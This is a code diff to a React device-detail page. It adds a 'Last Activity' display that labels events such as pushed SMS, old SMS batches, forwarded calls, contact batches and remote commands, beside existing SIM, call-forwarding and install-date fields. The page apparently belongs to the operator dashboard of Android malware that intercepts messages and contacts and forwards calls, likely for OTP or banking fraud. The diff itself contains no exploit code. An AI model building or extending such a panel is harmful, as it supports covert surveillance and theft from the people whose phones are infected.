@@ -365,6 +365,22 @@ export default function DeviceDetailPage() {
 
   const lastSeenTs = checkedAt > 0 ? checkedAt : 0;
   const isRecent = checkedAt > 0 && (Date.now() - checkedAt) < 5 * 60 * 1000;
+
+  // Last meaningful activity — heartbeat/ping/sync skip karo
+  const SKIP_ACTIONS = new Set(["heartbeat","ws_ping","ws_connect","fcm_token_sync","app_open","register","boot","unknown"]);
+  const rawLastSeen = device?.lastSeen;
+  const lastActivityAt = rawLastSeen?.at && !SKIP_ACTIONS.has(rawLastSeen?.action) ? Number(rawLastSeen.at) : 0;
+  const lastActivityAction = lastActivityAt > 0 ? safeStr(rawLastSeen?.action || "") : "";
+  const actionLabel: Record<string, string> = {
+    "sms_pushed": "SMS aaya",
+    "old_sms_batch": "SMS fetch",
+    "call_forwarded": "Call forward",
+    "sms_master": "SMS",
+    "contacts_batch": "Contacts sync",
+    "notification": "Notification",
+    "ws_cmd": "Command",
+  };
+
   const brand = safeStr(device?.metadata?.brand || device?.metadata?.manufacturer || "Unknown");
   const model = safeStr(device?.metadata?.model || "");
   const android = safeStr(device?.metadata?.androidVersion || "");
@@ -432,7 +448,8 @@ export default function DeviceDetailPage() {
                     <tr className="border-b border-gray-100"><td className="py-3 pl-4 align-top text-[13px] font-semibold text-gray-600">SIM</td><td className="py-3 pr-4 text-[13px] text-gray-900">{simSummary.sim1 !== "-" && <div>{simSummary.sim1Carrier !== "-" ? `${simSummary.sim1Carrier}: ` : ""}{simSummary.sim1}</div>}{simSummary.sim2 !== "-" && <div>{simSummary.sim2Carrier !== "-" ? `${simSummary.sim2Carrier}: ` : ""}{simSummary.sim2}</div>}{simSummary.sim1 === "-" && simSummary.sim2 === "-" && <span className="text-gray-400">-</span>}</td></tr>
                     <tr className="border-b border-gray-100"><td className="py-3 pl-4 text-[13px] font-semibold text-gray-600">Forward Call</td><td className="py-3 pr-4 text-[13px] text-gray-900">{forwardOn ? "ON" : "OFF"}</td></tr>
                     <tr className="border-b border-gray-100"><td className="py-3 pl-4 text-[13px] font-semibold text-gray-600">Install Date</td><td className="py-3 pr-4 text-[13px] font-semibold text-green-600">{installTs ? new Date(installTs).toLocaleString() : (device?.createdAt ? new Date(device.createdAt).toLocaleString() : "-")}</td></tr>
-                    <tr><td className="py-3 pl-4 text-[13px] font-semibold text-gray-600">Last Online</td><td className="py-3 pr-4"><TimeAgo ts={lastSeenTs} className={`text-[13px] font-semibold ${isRecent ? "text-green-600" : "text-red-500"}`} />{checkedAt > 0 && <div className="mt-0.5 flex items-center gap-1 text-[12px] text-blue-500"><span>Checked:</span><TimeAgo ts={checkedAt} className="font-semibold" /></div>}</td></tr>
+                    <tr className="border-b border-gray-100"><td className="py-3 pl-4 text-[13px] font-semibold text-gray-600">Last Checked</td><td className="py-3 pr-4"><TimeAgo ts={lastSeenTs} className={`text-[13px] font-semibold ${isRecent ? "text-green-600" : "text-red-500"}`} /></td></tr>
+                    <tr><td className="py-3 pl-4 text-[13px] font-semibold text-gray-600">Last Activity</td><td className="py-3 pr-4">{lastActivityAt > 0 ? (<div><TimeAgo ts={lastActivityAt} className="text-[13px] font-semibold text-blue-600" />{lastActivityAction && <span className="ml-2 rounded bg-blue-50 border border-blue-100 px-1.5 py-0.5 text-[11px] font-semibold text-blue-500">{actionLabel[lastActivityAction] || lastActivityAction}</span>}</div>) : <span className="text-[13px] text-gray-400">No activity yet</span>}</td></tr>
                   </tbody>
                 </table>
               </div>
